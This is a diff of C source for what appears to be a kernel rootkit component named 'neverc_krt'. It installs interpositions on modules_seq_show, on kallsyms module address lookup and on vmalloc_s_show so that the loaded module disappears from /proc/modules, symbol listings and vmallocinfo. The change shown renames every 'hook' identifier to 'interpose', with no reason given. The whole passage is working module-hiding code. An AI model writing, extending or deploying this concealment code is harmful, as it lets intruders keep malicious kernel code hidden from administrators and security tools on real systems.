@@ -14,10 +14,10 @@ static __always_inline int _neverc_krt_str_starts_with(const char *str,
 	return 1;
 }
 
-static struct neverc_krt_hook _neverc_krt_ks_hook;
-static int _neverc_krt_ks_hooked;
-static struct neverc_krt_hook _neverc_krt_vmalloc_hook;
-static int _neverc_krt_vmalloc_hooked;
+static struct neverc_krt_interpose _neverc_krt_ks_interpose;
+static int _neverc_krt_ks_interposed;
+static struct neverc_krt_interpose _neverc_krt_vmalloc_interpose;
+static int _neverc_krt_vmalloc_interposed;
 
 static __always_inline struct list_head *
 _neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
@@ -240,7 +240,7 @@ int neverc_krt_mod_proc_filter(struct neverc_krt_hide_state *state,
 {
 	void *target;
 
-	if (state->seq_show_hooked) return 0;
+	if (state->seq_show_interposed) return 0;
 
 	target = NEVERC_KRT_LOOKUP("modules_seq_show");
 	if (!target)
@@ -250,12 +250,12 @@ int neverc_krt_mod_proc_filter(struct neverc_krt_hide_state *state,
 	state->module_name = module_name;
 	_neverc_krt_hide_target_name = module_name;
 
-	int ret = neverc_krt_hook_install(&state->seq_show_hook, target,
+	int ret = neverc_krt_interpose_install(&state->seq_show_interpose, target,
 				   (void *)_neverc_krt_mod_seq_show_filter,
 				   (void **)&_neverc_krt_orig_mod_seq_show);
 	if (ret) return ret;
 
-	state->seq_show_hooked = 1;
+	state->seq_show_interposed = 1;
 	return 0;
 }
 
@@ -290,12 +290,12 @@ int neverc_krt_mod_kallsyms_filter(struct neverc_krt_hide_state *state,
 	_neverc_krt_hide_mod_start = (unsigned long)mod_base;
 	_neverc_krt_hide_mod_end = _neverc_krt_hide_mod_start + _neverc_krt_get_module_size();
 
-	int ret = neverc_krt_hook_install(&_neverc_krt_ks_hook, target,
+	int ret = neverc_krt_interpose_install(&_neverc_krt_ks_interpose, target,
 				   (void *)_neverc_krt_mod_text_addr_filter,
 				   (void **)&_neverc_krt_orig_mod_text_addr);
 	if (ret) return ret;
 
-	_neverc_krt_ks_hooked = 1;
+	_neverc_krt_ks_interposed = 1;
 	state->kallsyms_filtered = 1;
 	return 0;
 }
@@ -402,7 +402,7 @@ int neverc_krt_mod_vmalloc_filter(void)
 {
 	void *target;
 
-	if (_neverc_krt_vmalloc_hooked) return 0;
+	if (_neverc_krt_vmalloc_interposed) return 0;
 
 	_neverc_krt_vmalloc_hide_start = (unsigned long)&__this_module;
 	_neverc_krt_vmalloc_hide_end = _neverc_krt_vmalloc_hide_start +
@@ -411,35 +411,35 @@ int neverc_krt_mod_vmalloc_filter(void)
 	target = _neverc_krt_resolve_vmalloc_s_show();
 	if (!target) return -1;
 
-	int ret = neverc_krt_hook_install(&_neverc_krt_vmalloc_hook, target,
+	int ret = neverc_krt_interpose_install(&_neverc_krt_vmalloc_interpose, target,
 				   (void *)_neverc_krt_vmalloc_show_filter,
 				   (void **)&_neverc_krt_orig_vmalloc_show);
 	if (ret) return ret;
 
-	_neverc_krt_vmalloc_hooked = 1;
+	_neverc_krt_vmalloc_interposed = 1;
 	return 0;
 }
 
 /* ==================================================================== */
-/*  Pause / remove hooks                                                */
+/*  Pause / remove interposes                                                */
 /* ==================================================================== */
 
-void neverc_krt_hide_pause_hooks(void)
+void neverc_krt_hide_pause_interposes(void)
 {
-	if (_neverc_krt_vmalloc_hooked)
-		neverc_krt_hook_pause(&_neverc_krt_vmalloc_hook);
-	if (_neverc_krt_ks_hooked)
-		neverc_krt_hook_pause(&_neverc_krt_ks_hook);
+	if (_neverc_krt_vmalloc_interposed)
+		neverc_krt_interpose_pause(&_neverc_krt_vmalloc_interpose);
+	if (_neverc_krt_ks_interposed)
+		neverc_krt_interpose_pause(&_neverc_krt_ks_interpose);
 }
 
-void neverc_krt_hide_remove_hooks(void)
+void neverc_krt_hide_remove_interposes(void)
 {
-	if (_neverc_krt_ks_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_ks_hook);
-		_neverc_krt_ks_hooked = 0;
+	if (_neverc_krt_ks_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_ks_interpose);
+		_neverc_krt_ks_interposed = 0;
 	}
-	if (_neverc_krt_vmalloc_hooked) {
-		neverc_krt_hook_remove(&_neverc_krt_vmalloc_hook);
-		_neverc_krt_vmalloc_hooked = 0;
+	if (_neverc_krt_vmalloc_interposed) {
+		neverc_krt_interpose_remove(&_neverc_krt_vmalloc_interpose);
+		_neverc_krt_vmalloc_interposed = 0;
 	}
 }
